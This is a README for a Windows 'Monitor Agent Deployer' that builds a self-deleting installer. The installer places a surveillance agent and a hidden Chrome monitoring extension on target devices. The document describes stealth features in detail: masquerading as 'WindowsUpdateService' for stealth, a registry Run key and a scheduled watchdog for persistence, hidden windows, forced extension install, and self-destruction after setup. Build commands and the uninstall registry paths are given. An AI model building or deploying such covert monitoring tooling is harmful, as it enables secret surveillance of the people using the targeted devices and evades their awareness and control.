# Monitor Agent Deployer

A self-contained Windows executable that deploys the monitoring agent to target devices.

## Features

- **Automatic Python Installation**: Checks if Python is installed, downloads and installs it silently if not
- **Dependency Management**: Installs all required Python packages automatically
- **Firewall Configuration**: Opens required ports (5000, 5001) for communication with the dashboard
- **Dashboard Connection**: Prompts user to enter the dashboard IP address
- **Silent Background Operation**: Runs invisibly after setup
- **Persistence**:
  - Registry startup entry
  - Scheduled task watchdog that restarts the agent if stopped
  - Configuration backup in registry
- **Self-Destruction**: Deletes the installer EXE after successful setup
- **Chrome Extension**: Automatically installs and hides the browser monitoring extension

## Building the EXE

### Prerequisites

1. Python 3.11+ installed on your build machine
2. PyInstaller installed: `pip install pyinstaller`

### Build Steps

```bash
cd deployer

# Option 1: Use the build script
python build.py

# Option 2: Use PyInstaller directly with spec file
pyinstaller MonitorSetup.spec

# Option 3: Manual PyInstaller command
pyinstaller --onefile --console --name MonitorSetup --uac-admin ^
    --add-data "../agent;agent" ^
    --add-data "../extensions/chromium;extensions/chromium" ^
    --hidden-import tkinter ^
    --hidden-import tkinter.simpledialog ^
    deploy.py
```

The output EXE will be in `deployer/dist/MonitorSetup.exe` and also copied to the project root.

## Deployment

1. **On the Dashboard Machine**:

   - Start the monitoring server: `cd server && python run.py`
   - Note the machine's IP address on the local network

2. **On Target Devices**:
   - Copy `MonitorSetup.exe` to the target device
   - Run as Administrator (it will request elevation if not)
   - Enter the Dashboard IP address when prompted
   - The installer will:
     1. Install Python if needed
     2. Configure firewall
     3. Install dependencies
     4. Copy agent and extension files
     5. Set up persistence
     6. Start the monitoring service
     7. Delete itself

## What Gets Installed

```
%LOCALAPPDATA%\WindowsUpdate\
├── agent\                    # Monitoring agent source
├── extension\                # Chrome extension files
├── native_host\              # Chrome native messaging
├── config.json               # Configuration
├── monitor_service.pyw       # Background service script
├── start_service.vbs         # Silent starter
├── update.log                # Installation log
└── service.log               # Runtime log
```

## Persistence Mechanisms

1. **Registry Run Key**: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateService`
2. **Scheduled Task**: `WindowsUpdateService` - runs every 5 minutes and on logon
3. **Config Backup**: `HKCU\SOFTWARE\WindowsUpdateService`

## Security Notes

- The agent disguises itself as "WindowsUpdateService" for stealth
- Console window is hidden during operation
- Logs are stored locally for debugging
- Admin privileges required to stop the service or uninstall

## Uninstallation

To completely remove the agent:

```powershell
# Run as Administrator

# Stop the service
taskkill /f /im pythonw.exe 2>nul
taskkill /f /im python.exe 2>nul

# Remove scheduled task
schtasks /delete /tn "WindowsUpdateService" /f

# Remove registry entries
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /f
reg delete "HKCU\SOFTWARE\WindowsUpdateService" /f
reg delete "HKCU\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /f
reg delete "HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.monitor.native_host" /f

# Remove files
rmdir /s /q "%LOCALAPPDATA%\WindowsUpdate"

# Remove firewall rules
netsh advfirewall firewall delete rule name="Windows Update Helper Port 5000"
netsh advfirewall firewall delete rule name="Windows Update Helper Port 5001"
```

## Troubleshooting

1. **Check logs**:

   - `%LOCALAPPDATA%\WindowsUpdate\update.log` - Installation log
   - `%LOCALAPPDATA%\WindowsUpdate\service.log` - Runtime log

2. **Manually test connection**:

   ```powershell
   Test-NetConnection -ComputerName <DASHBOARD_IP> -Port 5000
   ```

3. **Check if service is running**:

   ```powershell
   Get-Process pythonw -ErrorAction SilentlyContinue
   ```

4. **View scheduled task**:
   ```powershell
   schtasks /query /tn "WindowsUpdateService"
   ```

## Configuration

Configuration is stored in `%LOCALAPPDATA%\WindowsUpdate\config.json`:

```json
{
  "dashboard_ip": "192.168.1.100",
  "server_url": "http://192.168.1.100:5000",
  "installed_at": "2024-01-15 10:30:00",
  "computer_name": "WORKSTATION-01",
  "username": "john.doe"
}
```

To change the dashboard IP after installation, edit this file and restart the service.
